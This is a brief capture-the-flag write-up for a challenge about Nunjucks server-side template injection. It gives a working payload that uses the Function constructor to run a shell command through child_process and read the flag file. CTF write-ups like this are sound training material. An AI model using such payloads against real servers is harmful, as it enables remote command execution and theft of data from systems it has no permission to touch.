### Chal Desc:
Watching the sunset with nunjucks to make sure your server side is always protected. The flag is on /app/flag.

URL: http://cybersecweek.ua.pt:2003/

Soln:  Classic SSTI attack 

If we apply different commands, we get an error page that tell us it’s nunjucks, so we have to use nunjucks SSTI.

{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /app/flag')")()}}

